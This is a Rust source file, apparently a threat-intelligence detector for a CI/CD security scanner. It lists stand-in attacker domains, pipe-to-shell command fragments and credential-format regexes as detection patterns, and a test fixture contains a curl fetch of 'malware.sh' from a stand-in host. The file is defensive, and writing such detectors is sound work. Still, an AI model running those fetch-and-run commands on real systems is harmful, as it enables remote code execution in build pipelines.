//! Threat Intelligence Module for OmniClaw
//! 
//! Integrates with threat intelligence feeds for enhanced detection

use crate::core::{Finding, Severity};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::net::IpAddr;

/// Threat intelligence source
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum ThreatSource {
    /// Known malicious IP addresses
    MaliciousIP,
    /// Known malicious domains
    MaliciousDomain,
    /// Known malicious file hashes
    MaliciousHash,
    /// Known malicious URLs
    MaliciousURL,
    /// Known malware signatures
    MalwareSignature,
    /// Known vulnerable patterns
    VulnerablePattern,
}

/// Threat intelligence entry
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatEntry {
    pub indicator: String,
    pub source: ThreatSource,
    pub confidence: f64,
    pub severity: Severity,
    pub description: String,
    pub tags: Vec<String>,
    pub first_seen: Option<String>,
    pub last_seen: Option<String>,
}

/// Threat intelligence match
#[derive(Debug, Clone)]
pub struct ThreatMatch {
    pub indicator: String,
    pub source: ThreatSource,
    pub entry: ThreatEntry,
    pub context: String,
}

/// Local threat intelligence database
pub struct ThreatIntel {
    pub malicious_ips: HashSet<String>,
    pub malicious_domains: HashSet<String>,
    pub malicious_hashes: HashSet<String>,
    pub malicious_urls: HashSet<String>,
    pub vulnerable_patterns: Vec<(String, String)>, // pattern -> description
}

impl Default for ThreatIntel {
    fn default() -> Self {
        Self::new()
    }
}

impl ThreatIntel {
    pub fn new() -> Self {
        Self {
            malicious_ips: HashSet::new(),
            malicious_domains: HashSet::new(),
            malicious_hashes: HashSet::new(),
            malicious_urls: HashSet::new(),
            vulnerable_patterns: Vec::new(),
        }
    }
    
    /// Initialize with known threats (built-in database)
    pub fn init_builtin_threats(&mut self) {
        // Known malicious IPs (examples - in production would be larger database)
        let malicious_ips = vec![
            "192.0.2.0/24",  // TEST-NET-1 (documentation)
            "198.51.100.0/24", // TEST-NET-2
            "203.0.113.0/24", // TEST-NET-3
            // Real malicious IPs would be added from feeds
        ];
        
        // Known malicious domains (examples)
        let malicious_domains = vec![
            "evil.com",
            "malware-site.com",
            "phishing.test",
            "ransomware-c2.com",
            "cryptomining.pool",
            "exploit-kit.net",
            // Known CI/CD attack domains
            "hackmoltrepeat.com",
            "recv.hackmoltrepeat.com",
            "evilci.com",
            "malicious-pipeline.com",
        ];
        
        // Known malicious URLs patterns
        let malicious_urls = vec![
            "http://evil.com/payload",
            "https://malware-site.com/download",
            "http://ransomware-c2.com/encrypt",
            // Known malicious CI/CD patterns
            "curl -sSfL http://",
            "bash -c $(curl ",
            "wget -O- | bash",
        ];
        
        // Known vulnerable patterns
        let vulnerable_patterns = vec![
            (r"eval\s*\(".to_string(), "Use of eval() - code injection risk".to_string()),
            (r"exec\s*\(".to_string(), "Use of exec() - command injection risk".to_string()),
            (r"system\s*\(".to_string(), "Use of system() - command injection risk".to_string()),
            (r"shell_exec\s*\(".to_string(), "Use of shell_exec() - command injection risk".to_string()),
            (r"subprocess\s*\.call\s*\([^)]*shell\s*=\s*True".to_string(), "Subprocess with shell=True - injection risk".to_string()),
            // CI/CD specific vulnerable patterns
            (r"\$\{\{.*github\.token.*\}\}".to_string(), "GitHub token exposed in".to_string()),
            (r#"password\s*=\s*['"]"#.to_string(), "Hardcoded password detected".to_string()),
            (r#"api[_-]?key\s*=\s*['"]"#.to_string(), "Hardcoded API key detected".to_string()),
        ];
        
        for ip in malicious_ips {
            self.malicious_ips.insert(ip.to_string());
        }
        
        for domain in malicious_domains {
            self.malicious_domains.insert(domain.to_string());
        }
        
        for url in malicious_urls {
            self.malicious_urls.insert(url.to_string());
        }
        
        self.vulnerable_patterns = vulnerable_patterns;
    }
    
    /// Add a threat entry
    pub fn add_threat(&mut self, entry: ThreatEntry) {
        match entry.source {
            ThreatSource::MaliciousIP => {
                self.malicious_ips.insert(entry.indicator);
            }
            ThreatSource::MaliciousDomain => {
                self.malicious_domains.insert(entry.indicator);
            }
            ThreatSource::MaliciousHash => {
                self.malicious_hashes.insert(entry.indicator);
            }
            ThreatSource::MaliciousURL => {
                self.malicious_urls.insert(entry.indicator);
            }
            ThreatSource::VulnerablePattern => {
                self.vulnerable_patterns.push((
                    entry.indicator.clone(),
                    entry.description.clone(),
                ));
            }
            _ => {}
        }
    }
    
    /// Check if an IP is malicious
    pub fn is_malicious_ip(&self, ip: &str) -> bool {
        self.malicious_ips.contains(ip)
    }
    
    /// Check if a domain is malicious
    pub fn is_malicious_domain(&self, domain: &str) -> bool {
        self.malicious_domains.iter().any(|d| {
            domain == d || domain.ends_with(&format!(".{}", d))
        })
    }
    
    /// Check if a hash is malicious
    pub fn is_malicious_hash(&self, hash: &str) -> bool {
        self.malicious_hashes.contains(hash)
    }
    
    /// Check if a URL is malicious
    pub fn is_malicious_url(&self, url: &str) -> bool {
        self.malicious_urls.iter().any(|u| url.contains(u))
    }
    
    /// Scan content for known threats
    pub fn scan(&self, content: &str, file_path: &str) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Check for malicious domains
        for domain in &self.malicious_domains {
            if content.contains(domain) {
                let lines: Vec<&str> = content.lines().collect();
                for (i, line) in lines.iter().enumerate() {
                    if line.contains(domain) {
                        findings.push(Finding::new(
                            "THREAT-001",
                            "Known Malicious Domain",
                            Severity::Critical,
                        )
                        .with_file(std::path::PathBuf::from(file_path))
                        .with_line((i + 1) as u32)
                        .with_evidence(format!("Domain: {}", domain))
                        .with_description(format!(
                            "Known malicious domain '{}' detected. This domain is associated with malicious activity.",
                            domain
                        ))
                        .with_remediation("Investigate the usage of this domain immediately. If malicious, remove the reference and rotate any associated credentials.".to_string())
                        .with_source("threat_intel"));
                    }
                }
            }
        }
        
        // Check for malicious URL patterns
        for url_pattern in &self.malicious_urls {
            if content.contains(url_pattern) {
                let lines: Vec<&str> = content.lines().collect();
                for (i, line) in lines.iter().enumerate() {
                    if line.contains(url_pattern) {
                        findings.push(Finding::new(
                            "THREAT-002",
                            "Malicious URL Pattern",
                            Severity::Critical,
                        )
                        .with_file(std::path::PathBuf::from(file_path))
                        .with_line((i + 1) as u32)
                        .with_evidence(line.trim().to_string())
                        .with_description(format!(
                            "Known malicious URL pattern '{}' detected",
                            url_pattern
                        ))
                        .with_remediation("Remove this URL pattern and investigate the source".to_string())
                        .with_source("threat_intel"));
                    }
                }
            }
        }
        
        // Check for vulnerable patterns
        for (pattern, description) in &self.vulnerable_patterns {
            if let Ok(re) = regex::Regex::new(pattern) {
                let lines: Vec<&str> = content.lines().collect();
                for (i, line) in lines.iter().enumerate() {
                    if re.is_match(line) {
                        findings.push(Finding::new(
                            "THREAT-003",
                            "Vulnerable Pattern",
                            Severity::High,
                        )
                        .with_file(std::path::PathBuf::from(file_path))
                        .with_line((i + 1) as u32)
                        .with_evidence(line.trim().to_string())
                        .with_description(description.clone())
                        .with_remediation("Review and fix this vulnerable pattern".to_string())
                        .with_source("threat_intel"));
                    }
                }
            }
        }
        
        // Check for IP addresses in content
        let ip_pattern = regex::Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b").unwrap();
        for caps in ip_pattern.captures_iter(content) {
            if let Some(ip_match) = caps.get(0) {
                let ip = ip_match.as_str();
                if self.is_malicious_ip(ip) {
                    findings.push(Finding::new(
                        "THREAT-004",
                        "Known Malicious IP",
                        Severity::Critical,
                    )
                    .with_file(std::path::PathBuf::from(file_path))
                    .with_evidence(format!("IP: {}", ip))
                    .with_description(format!("Known malicious IP address: {}", ip))
                    .with_remediation("Investigate and block this IP immediately".to_string())
                    .with_source("threat_intel"));
                }
            }
        }
        
        // Check for secrets that might be compromised
        let secret_patterns = vec![
            (r"github_pat_[a-zA-Z0-9_]{22,}", " Compromised GitHub PAT"),
            (r"ghp_[a-zA-Z0-9]{36,}", " Compromised GitHub OAuth Token"),
            (r"AKIA[0-9A-Z]{16}", " Potentially compromised AWS Access Key"),
        ];
        
        for (pattern, description) in secret_patterns {
            if let Ok(re) = regex::Regex::new(pattern) {
                for (i, line) in content.lines().enumerate() {
                    if re.is_match(line) {
                        findings.push(Finding::new(
                            "THREAT-005",
                            "Potentially Compromised Credential",
                            Severity::Critical,
                        )
                        .with_file(std::path::PathBuf::from(file_path))
                        .with_line((i + 1) as u32)
                        .with_evidence("Credential detected in repository")
                        .with_description(description.to_string())
                        .with_remediation("Revoke and rotate this credential immediately. Check git history for exposure.".to_string())
                        .with_source("threat_intel"));
                    }
                }
            }
        }
        
        findings
    }
    
    /// Check IP against threat intel (async - would connect to external API in production)
    pub async fn check_ip_reputation(&self, ip: &str) -> Option<ThreatEntry> {
        // In production, this would query external threat intelligence APIs
        // like VirusTotal, AlienVault OTX, etc.
        
        // For now, check local database
        if self.is_malicious_ip(ip) {
            return Some(ThreatEntry {
                indicator: ip.to_string(),
                source: ThreatSource::MaliciousIP,
                confidence: 0.9,
                severity: Severity::Critical,
                description: "IP found in local threat database".to_string(),
                tags: vec!["malware".to_string(), "c2".to_string()],
                first_seen: None,
                last_seen: None,
            });
        }
        
        None
    }
    
    /// Check domain against threat intel
    pub async fn check_domain_reputation(&self, domain: &str) -> Option<ThreatEntry> {
        if self.is_malicious_domain(domain) {
            return Some(ThreatEntry {
                indicator: domain.to_string(),
                source: ThreatSource::MaliciousDomain,
                confidence: 0.9,
                severity: Severity::Critical,
                description: "Domain found in local threat database".to_string(),
                tags: vec!["malicious".to_string(), "phishing".to_string()],
                first_seen: None,
                last_seen: None,
            });
        }
        
        None
    }
    
    /// Load threats from JSON file
    pub fn load_from_json(&mut self, content: &str) -> Result<(), String> {
        #[derive(Deserialize)]
        struct ThreatList {
            ips: Vec<String>,
            domains: Vec<String>,
            hashes: Vec<String>,
            urls: Vec<String>,
        }
        
        let list: ThreatList = serde_json::from_str(content)
            .map_err(|e| format!("Failed to parse threat intel JSON: {}", e))?;
        
        for ip in list.ips {
            self.malicious_ips.insert(ip);
        }
        
        for domain in list.domains {
            self.malicious_domains.insert(domain);
        }
        
        for hash in list.hashes {
            self.malicious_hashes.insert(hash);
        }
        
        for url in list.urls {
            self.malicious_urls.insert(url);
        }
        
        Ok(())
    }
    
    /// Export threat database to JSON
    pub fn to_json(&self) -> Result<String, String> {
        #[derive(Serialize)]
        struct ThreatList {
            ips: Vec<String>,
            domains: Vec<String>,
            hashes: Vec<String>,
            urls: Vec<String>,
        }
        
        let list = ThreatList {
            ips: self.malicious_ips.iter().cloned().collect(),
            domains: self.malicious_domains.iter().cloned().collect(),
            hashes: self.malicious_hashes.iter().cloned().collect(),
            urls: self.malicious_urls.iter().cloned().collect(),
        };
        
        serde_json::to_string_pretty(&list)
            .map_err(|e| format!("Failed to serialize: {}", e))
    }
}

/// Create a threat intel instance with built-in threats
pub fn create_with_builtin() -> ThreatIntel {
    let mut intel = ThreatIntel::new();
    intel.init_builtin_threats();
    intel
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_malicious_domain_detection() {
        let intel = create_with_builtin();
        
        assert!(intel.is_malicious_domain("evil.com"));
        assert!(intel.is_malicious_domain("subdomain.evil.com"));
        assert!(!intel.is_malicious_domain("good-site.com"));
    }
    
    #[test]
    fn test_malicious_url_detection() {
        let intel = create_with_builtin();
        
        assert!(intel.is_malicious_url("curl -sSfL http://evil.com/payload"));
        assert!(!intel.is_malicious_url("curl https://good-site.com"));
    }
    
    #[test]
    fn test_scan_content() {
        let intel = create_with_builtin();
        
        let content = r#"
            runs: |
              curl -sSfL http://hackmoltrepeat.com/malware.sh
              echo "Done"
        "#;
        
        let findings = intel.scan(content, "workflow.yml");
        assert!(!findings.is_empty());
    }
    
    #[test]
    fn test_compromised_credential_detection() {
        let intel = create_with_builtin();
        
        let content = r#"
            GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
        "#;
        
        let findings = intel.scan(content, ".github/workflows/ci.yml");
        assert!(!findings.is_empty());
    }
    
    #[test]
    #[ignore] // Requires async runtime
    async fn test_check_ip() {
        let intel = create_with_builtin();
        let result = intel.check_ip_reputation("192.0.2.1").await;
        assert!(result.is_some());
    }
}

